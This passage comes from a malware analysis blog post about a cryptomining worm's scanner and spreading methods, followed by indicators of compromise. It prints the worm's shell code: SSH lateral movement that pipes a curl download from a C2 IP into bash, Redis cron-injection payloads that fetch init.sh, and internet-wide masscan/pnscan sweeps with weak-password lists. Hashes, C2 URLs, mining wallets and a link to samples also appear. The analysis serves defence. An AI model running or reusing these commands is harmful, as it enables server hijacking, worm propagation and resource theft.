machine.  Before a payload is being used, the scanner first tries to identify
if the machine runs a vulnerable version of the expected service. For some
services, the scanner doesn&rsquo;t try to exploit a vulnerability. Instead, it uses
unauthenticated access or weak passwords.</p>
<p>If the scanner finds a <em>redis</em> service, it first tries to access it without any
credentials. If that fails it uses the following set of passwords:</p>
<ul>
<li>123456</li>
<li>redis123</li>
<li>root</li>
<li>111111</li>
</ul>
<p>If it successfully authenticates to the service, the scanner uses the
<code>flushall</code> command to gain remote code execution. The command is used to add a
new cron tab entry. The entry is <code>*/1 * * * * curl -fsSL %s |sh</code> where <code>%s</code> is
replace with C2 URL to <code>init.sh</code>.</p>
<p>Another service the scanner tries to access without any credentials is
<em>Hadoop</em>.  If the cluster is not protected with credentials, the scanner tries
to add a new application on the cluster that will download and execute the
malware.</p>
<p>The final service the scan module tries to gain access to via credentials is
instances of <em>MSSQL</em>. The module tries to brute force the password for the <em>sa</em>
user account with a list of 2993 different passwords.</p>
<p>The scanner module has a function for exploiting what the author calls <em>CCTV</em>.
The malware exploits backdoors in <em>CCTV DVRs</em>. The flaw was reported by Andrew
Tierney
(<a href="https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/">PenTestPartners</a>)
back in February 2016. The scanner sends the query <code>%s/shell?uname</code> to the
web server. If it gets a response that indicates the <em>shell</em> functionality is
operational, it will use the shell to execute commands to download and execute
the setup script.</p>
<p>Other vulnerabilities, the scanning module tries to exploit are <em>CVE-2015-1427</em>
and <em>CVE-2014-3120</em> for <em>Elasticsearch</em>, <em>CVE-2018-1273</em> for <em>Spring Data
Commons</em>, and <em>CVE-2017-10271</em> for <em>WebLogic</em>. If the module finds a webserver
that uses <em>Drupal</em>, it tries to exploit <em>CVE-2018-7600</em> which is also known as
<em>Drupalgeddon2</em>. The <em>Drupalgeddon2</em> exploit writes data to the file
<code>/hellohellohello.txt</code> in the web-root directory. The last set of CVEs
exploited by the malware <em>ThinkPHP</em> using CVE-2019-9082 and a vulnerability
that doesn&rsquo;t appear to have a designated CVE. Both vulnerabilities have <em>PoCs</em>
available on vuln-hub.
[<a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce">1</a>,
<a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">2</a>]</p>
<p>Older versions of the malware didn&rsquo;t have a binary scanner module. Instead, the
scanning module was implemented in <em>shell</em> script. One of the ways the older
version would spread was via known <em>ssh</em> host and stored keys. The code snippet
below from an older version of the malware is showing this functionality. After
this, the setup script would download the installation script for the scanner
module.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /root/.ssh/known_hosts <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -f /root/.ssh/id_rsa.pub <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
  <span style="color:#66d9ef">for</span> h in <span style="color:#66d9ef">$(</span>grep -oE <span style="color:#e6db74">&#34;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&#34;</span> /root/.ssh/known_hosts<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> ssh -oBatchMode<span style="color:#f92672">=</span>yes -oConnectTimeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> -oStrictHostKeyChecking<span style="color:#f92672">=</span>no $h <span style="color:#e6db74">&#39;curl -o-  http://178.157.91.26/ec8ce6ab/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#39;</span> &amp; <span style="color:#66d9ef">done</span>
<span style="color:#66d9ef">fi</span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /root/.ssh/known_hosts <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -f /root/.ssh/id_rsa.pub <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
  <span style="color:#66d9ef">for</span> h in <span style="color:#66d9ef">$(</span>grep -oE <span style="color:#e6db74">&#34;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&#34;</span> /root/.ssh/known_hosts<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> ssh -oBatchMode<span style="color:#f92672">=</span>yes -oConnectTimeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> -oStrictHostKeyChecking<span style="color:#f92672">=</span>no $h <span style="color:#e6db74">&#39;cdl -o-  http://178.157.91.26/ec8ce6ab/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#39;</span> &amp; <span style="color:#66d9ef">done</span>
<span style="color:#66d9ef">fi</span>

$bbdir -fsSL http://178.157.91.26/ec8ce6ab/is.sh | bash
$bbdira -fsSL http://178.157.91.26/ec8ce6ab/is.sh | bash
</code></pre></div><p>The setup script would download two tools to scan for hosts: <em>masscan</em> and
<em>pnscan</em>.  The snippet below downloads <em>masscan</em> that is stored in a
tarball.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$bbdira -sL -o x1.tar.gz http://178.157.91.26/ec8ce6ab/1.0.4.tar.gz
sleep <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span> -f x1.tar.gz <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> tar zxf x1.tar.gz <span style="color:#f92672">&amp;&amp;</span> cd masscan-1.0.4 <span style="color:#f92672">&amp;&amp;</span> make <span style="color:#f92672">&amp;&amp;</span> make install <span style="color:#f92672">&amp;&amp;</span> cd .. <span style="color:#f92672">&amp;&amp;</span> rm -rf masscan-1.0.4
echo <span style="color:#e6db74">&#34;Masscan Installed&#34;</span>
</code></pre></div><p>The tool <em>pnscan</em> is downloaded from the official <em>ftp</em> site, as can be seen below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> ! <span style="color:#f92672">(</span> <span style="color:#f92672">[</span> -x /usr/local/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> -x /usr/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">)</span>; <span style="color:#66d9ef">then</span>
$bbdira -kLs ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz &gt; .x112 <span style="color:#f92672">||</span> $ccdira -q -O .x112 ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz
sleep <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span> -f .x112 <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> tar xf .x112<span style="color:#f92672">&amp;&amp;</span> cd pnscan-1.11 <span style="color:#f92672">&amp;&amp;</span> make lnx <span style="color:#f92672">&amp;&amp;</span> make install<span style="color:#f92672">&amp;&amp;</span> cd .. <span style="color:#f92672">&amp;&amp;</span> rm -rf pnscan-1.11 .x112
echo <span style="color:#e6db74">&#34;Pnscan Installed&#34;</span>
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>After everything has been downloaded, the install script downloads the <em>redis</em>
scanning logic.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$bbdir -fsSL http://178.157.91.26/ec8ce6ab/rs.sh | bash
$bbdira -fsSL http://178.157.91.26/ec8ce6ab/rs.sh | bash
</code></pre></div><p>The <em>redis</em> scanning script first creates the payload. As can be seen below, it
uses <em>cron</em> to gain code execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
sleep <span style="color:#ae81ff">1</span>
echo <span style="color:#e6db74">&#39;config set dbfilename &#34;backup.db&#34;&#39;</span> &gt; .dat
echo <span style="color:#e6db74">&#39;save&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;flushall&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;set backup1 &#34;\n\n\n*/2 * * * * cdl -fsSL http://178.157.91.26/ec8ce6ab/init.sh | sh\n\n&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;set backup2 &#34;\n\n\n*/3 * * * * wget -q -O- http://178.157.91.26/ec8ce6ab/init.sh | sh\n\n&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;set backup3 &#34;\n\n\n*/4 * * * * curl -fsSL http://45.137.151.106/ec8ce6abb3e952a85b85/init.sh | sh\n\n&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;set backup4 &#34;\n\n\n*/5 * * * * wdl -q -O- http://45.137.151.106/ec8ce6abb3e952a85b85/init.sh | sh\n\n&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;config set dir &#34;/var/spool/cron/&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;config set dbfilename &#34;root&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;save&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;config set dir &#34;/var/spool/cron/crontabs&#34;&#39;</span> &gt;&gt; .dat
echo <span style="color:#e6db74">&#39;save&#39;</span> &gt;&gt; .dat
</code></pre></div><p>The following code snippet is showing how <em>pnscan</em> is used to scan for <em>redis</em>
servers. For any found services, it tries to authenticate with weak
credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">pnx<span style="color:#f92672">=</span>pnscan
<span style="color:#f92672">[</span> -x /usr/local/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> pnx<span style="color:#f92672">=</span>/usr/local/bin/pnscan
<span style="color:#f92672">[</span> -x /usr/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> pnx<span style="color:#f92672">=</span>/usr/bin/pnscan
<span style="color:#66d9ef">for</span> x in <span style="color:#66d9ef">$(</span> seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">224</span> | sort -R <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
<span style="color:#66d9ef">for</span> y in <span style="color:#66d9ef">$(</span> seq <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">255</span> | sort -R <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
$pnx -t512 -R <span style="color:#e6db74">&#39;6f 73 3a 4c 69 6e 75 78&#39;</span> -W <span style="color:#e6db74">&#39;2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a&#39;</span> $x.$y.0.0/16 <span style="color:#ae81ff">6379</span> &gt; .r.$x.$y.o
awk <span style="color:#e6db74">&#39;/Linux/ {print $1, $3}&#39;</span> .r.$x.$y.o &gt; .r.$x.$y.l
<span style="color:#66d9ef">while</span> read -r h p; <span style="color:#66d9ef">do</span>
cat .dat | redis-cli -h $h -p $p --raw &amp;
cat .dat | redis-cli -h $h -p $p -a redis --raw &amp;
cat .dat | redis-cli -h $h -p $p -a root --raw &amp;
cat .dat | redis-cli -h $h -p $p -a oracle --raw &amp;
cat .dat | redis-cli -h $h -p $p -a password --raw &amp;
cat .dat | redis-cli -h $h -p $p -a p@aaw0rd --raw &amp;
cat .dat | redis-cli -h $h -p $p -a abc123 --raw &amp;
cat .dat | redis-cli -h $h -p $p -a abc123! --raw &amp;
cat .dat | redis-cli -h $h -p $p -a <span style="color:#ae81ff">123456</span> --raw &amp;
cat .dat | redis-cli -h $h -p $p -a admin --raw &amp;
<span style="color:#66d9ef">done</span> &lt; .r.$x.$y.l
</code></pre></div><p>The logic is similar for <em>masscan</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">masscan --max-rate <span style="color:#ae81ff">10000</span> -p6379 --shard <span style="color:#66d9ef">$(</span> seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">22000</span> | sort -R | head -n1 <span style="color:#66d9ef">)</span>/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null | awk <span style="color:#e6db74">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> | sort | uniq &gt; .shard
sleep <span style="color:#ae81ff">1</span>
<span style="color:#66d9ef">while</span> read -r h p; <span style="color:#66d9ef">do</span>
cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a redis --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a root --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a oracle --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a password --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a p@aaw0rd --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a abc123 --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a abc123! --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a <span style="color:#ae81ff">123456</span> --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a admin --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
<span style="color:#66d9ef">done</span> &lt; .shard
sleep <span style="color:#ae81ff">1</span>
masscan --max-rate <span style="color:#ae81ff">10000</span> -p6379 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2&gt;/dev/null | awk <span style="color:#e6db74">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> | sort | uniq &gt; .ranges
sleep <span style="color:#ae81ff">1</span>
<span style="color:#66d9ef">while</span> read -r h p; <span style="color:#66d9ef">do</span>
cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a redis --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a root --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a oracle --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a password --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a p@aaw0rd --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a abc123 --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a abc123! --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a <span style="color:#ae81ff">123456</span> --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
cat .dat | redis-cli -h $h -p $p -a admin --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
<span style="color:#66d9ef">done</span> &lt; .ranges
sleep <span style="color:#ae81ff">1</span>
ip a | grep -oE <span style="color:#e6db74">&#39;([0-9]{1,3}.?){4}/[0-9]{2}&#39;</span> 2&gt;/dev/null | sed <span style="color:#e6db74">&#39;s/\/\([0-9]\{2\}\)/\/16/g&#39;</span> &gt; .inet
sleep <span style="color:#ae81ff">1</span>
masscan --max-rate <span style="color:#ae81ff">10000</span> -p6379 -iL .inet | awk <span style="color:#e6db74">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> | sort | uniq &gt; .lan
sleep <span style="color:#ae81ff">1</span>
<span style="color:#66d9ef">while</span> read -r h p; <span style="color:#66d9ef">do</span>
cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
<span style="color:#66d9ef">done</span> &lt; .lan
sleep <span style="color:#ae81ff">60</span>
rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
</code></pre></div><h1 id="iocs">IOCs</h1>
<h2 id="scripts">Scripts</h2>
<table>
<thead>
<tr>
<th>Filename</th>
<th>SHA-256</th>
</tr>
</thead>
<tbody>
<tr>
<td>clean.bat</td>
<td>848e9b20dbf3e766ed306e78e07d9332fe065ec41a3d7d924f6345bba71de49b</td>
</tr>
<tr>
<td>init.ps1</td>
<td>2fa79dbf3341d880f8c08bee5796895683e6eb3dd76a537ea3a60f6ac33d9b17</td>
</tr>
<tr>
<td>init.sh</td>
<td>03927595ead68cbb3a31a6d27cf0c86abadce204bd4bff2a66fca8f6b7f306e2</td>
</tr>
<tr>
<td>is.sh</td>
<td>6faa026af253c784ef97ffec3a9953055d394061a9a1fbfdcc5b28445b73ffdc</td>
</tr>
<tr>
<td>rs.sh</td>
<td>e2b982f9540304e31ca8d1cdafb253da7d216d1cc939a281a1a95baaa4be9b2d</td>
</tr>
<tr>
<td>updata.sh</td>
<td>03927595ead68cbb3a31a6d27cf0c86abadce204bd4bff2a66fca8f6b7f306e2</td>
</tr>
<tr>
<td>update.ps1</td>
<td>2fa79dbf3341d880f8c08bee5796895683e6eb3dd76a537ea3a60f6ac33d9b17</td>
</tr>
<tr>
<td>update.sh</td>
<td>89bb4cb68372198a3937a315433bfffabeccfe14b2b70fbb883ec30476fa3e70</td>
</tr>
<tr>
<td>update.ps1</td>
<td>5f89619b59ff9f184203ac8a5e7ec88dbd82fa992292cb3ae236c8d5b884b576</td>
</tr>
<tr>
<td>update.sh</td>
<td>8eef72ded1b8ab8c72a089ce44149e772f1f6d1369f5f1dfa4a8c7ed5614c2a2</td>
</tr>
<tr>
<td>clean.bat</td>
<td>64210e25d19d1813e764c31ce78cb8ef20b11e671e58a02d0cee209d16005749</td>
</tr>
<tr>
<td>clean.bat</td>
<td>64210e25d19d1813e764c31ce78cb8ef20b11e671e58a02d0cee209d16005749</td>
</tr>
<tr>
<td>update.ps1</td>
<td>5f89619b59ff9f184203ac8a5e7ec88dbd82fa992292cb3ae236c8d5b884b576</td>
</tr>
<tr>
<td>update.sh</td>
<td>8eef72ded1b8ab8c72a089ce44149e772f1f6d1369f5f1dfa4a8c7ed5614c2a2</td>
</tr>
<tr>
<td>updata.sh</td>
<td>3c7faf7512565d86b1ec4fe2810b2006b75c3476b4a5b955f0141d9a1c237d38</td>
</tr>
</tbody>
</table>
<h2 id="binaries">Binaries</h2>
<table>
<thead>
<tr>
<th>Filename</th>
<th>SHA-256</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>networkservice</td>
<td>40c40bd3aa61d09b704748ecbb9ecbd9f34b0e4afb175036b12906900ce2cbde</td>
<td>Scanner module</td>
</tr>
<tr>
<td>networkservice.exe</td>
<td>a98e81b9fd8a8a78d7977ddb9c37f36bee0a51695898d0ae8065a3ea3af3057a</td>
<td>Scanner module</td>
</tr>
<tr>
<td>networkservices</td>
<td>ea55a206f7047f54a9e97cc3234848dfd3e49d0b5f9569b08545f1ad0e733286</td>
<td>Scanner module</td>
</tr>
<tr>
<td>sysguard</td>
<td>8129d9f08314ccf6ff7a978a272ff43e1515cd0a28f1f1aac7008a36dde3618b</td>
<td>Watch dog module</td>
</tr>
<tr>
<td>sysguard.exe</td>
<td>b7818c458f0e6e9a5d2080626c7cede1eac573fa2c4dae65d91607eeaa23bdf0</td>
<td>Watch dog module</td>
</tr>
<tr>
<td>sysguerd</td>
<td>bceee7d9ace363ef2bfb1494a9784a6377fe14c4c5fefa0c180fcec33a5d1716</td>
<td>Watch dog module</td>
</tr>
<tr>
<td>sysupdata</td>
<td>c51811c6d68b219d7804407ea54bd1f9b8ae0a4fcf1ddf6126740812bea52416</td>
<td>XMRig 5.6.0</td>
</tr>
<tr>
<td>sysupdata</td>
<td>e7446d595854b6bac01420378176d1193070ef776788af12300eb77e0a397bf7</td>
<td>XMRig (Fake name &ldquo;screen 2.8.5&rdquo;)</td>
</tr>
<tr>
<td>sysupdate.exe</td>
<td>559a8ff34cf807e508d32e3a28864c687263587fe4ffdcefe3f462a7072dcc74</td>
<td>XMRIG (Fake name &ldquo;jusched 2.8.5&rdquo;)</td>
</tr>
<tr>
<td>sysupdate.exe</td>
<td>e0a44f98e994ab0cdd88cacb803668903a302a83761e6376b80264364f6c5a9a</td>
<td>XMRig 5.6.0</td>
</tr>
</tbody>
</table>
<h2 id="network">Network</h2>
<ul>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/clean.bat</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/config.json</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/favorite.ico</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/networkservice</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/networkservice.exe</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/sysguard</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/sysguard.exe</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/sysupdate</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/sysupdate.exe</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/update.ps1</li>
<li>hxxp://146.71.79.230/363A3EDC10A2930DVNICE/update.sh</li>
<li>hxxp://178.157.91.26/ec8ce6ab/bd.sh</li>
<li>hxxp://178.157.91.26/ec8ce6ab/config.json</li>
<li>hxxp://178.157.91.26/ec8ce6ab/favorite.ico</li>
<li>hxxp://178.157.91.26/ec8ce6ab/iplog.php</li>
<li>hxxp://178.157.91.26/ec8ce6ab/is.sh</li>
<li>hxxp://178.157.91.26/ec8ce6ab/networkservics</li>
<li>hxxp://178.157.91.26/ec8ce6ab/sysguerd</li>
<li>hxxp://178.157.91.26/ec8ce6ab/sysupdata</li>
<li>hxxp://178.157.91.26/ec8ce6ab/updata.sh</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/config.json</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/favorite.ico</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/iplog.php</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/networkservics</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/sysguerd</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/sysupdata</li>
<li>hxxp://45.137.151.106/ec8ce6abb3e952a85b85/updata.sh</li>
<li>hxxps://us.gsearch.com.de/api/clean.bat</li>
<li>hxxps://us.gsearch.com.de/api/config.json</li>
<li>hxxps://us.gsearch.com.de/api/favorite.ico</li>
<li>hxxps://us.gsearch.com.de/api/networkservice</li>
<li>hxxps://us.gsearch.com.de/api/networkservice.exe</li>
<li>hxxps://us.gsearch.com.de/api/sysguard</li>
<li>hxxps://us.gsearch.com.de/api/sysguard.exe</li>
<li>hxxps://us.gsearch.com.de/api/sysupdate</li>
<li>hxxps://us.gsearch.com.de/api/sysupdate.exe</li>
<li>hxxps://us.gsearch.com.de/api/update.ps1</li>
<li>hxxps://us.gsearch.com.de/api/update.sh</li>
</ul>
<h2 id="crypto">Crypto</h2>
<table>
<thead>
<tr>
<th>Pool</th>
<th>Wallet/User</th>
</tr>
</thead>
<tbody>
<tr>
<td>xmr.f2pool.com:13531</td>
<td>43zqYTWj1JG1H1idZFQWwJZLTos3hbJ5iR3tJpEtwEi43UBbzPeaQxCRysdjYTtdc8aHao7csiWa5BTP9PfNYzyfSbbrwoR</td>
</tr>
<tr>
<td>randomxmonero.hk.nicehash.com:3380</td>
<td>3HVQkSGfvyyQ8ACpShBhegoKGLuTCMCiAr</td>
</tr>
<tr>
<td>xmr-eu2.nanopool.org:14444</td>
<td>43zqYTWj1JG1H1idZFQWwJZLTos3hbJ5iR3tJpEtwEi43UBbzPeaQxCRysdjYTtdc8aHao7csiWa5BTP9PfNYzyfSbbrwoR</td>
</tr>
</tbody>
</table>
<h1 id="appendix">Appendix</h1>
<p>If you would like to analyze this malware, I have made some samples available
<a href="https://ipfs.io/ipns/gomalware.lekstu.ga/orthrus/">here</a>.</p>

      </div>

      <footer>
        


        
      </footer>
    </article>

    
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
      <p>All rights reserved</p>
    
     © 2021
    
    
  </section>
</footer>

    </main>

    

  </body>

</html>
